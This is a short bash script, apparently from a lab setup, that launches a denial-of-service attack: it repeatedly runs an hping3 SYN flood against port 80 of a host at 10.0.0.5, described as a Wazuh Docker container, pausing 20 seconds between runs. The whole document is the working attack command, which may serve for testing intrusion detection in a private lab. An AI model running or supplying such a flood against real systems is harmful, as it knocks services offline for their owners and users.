#!/bin/bash

# DoS attack using hping3 
# Target is ns3_wazuh docker container (10.0.0.5)
while :; 
    sudo hping3 -S --flood -V -p 80 10.0.0.5
do sleep 20 ; done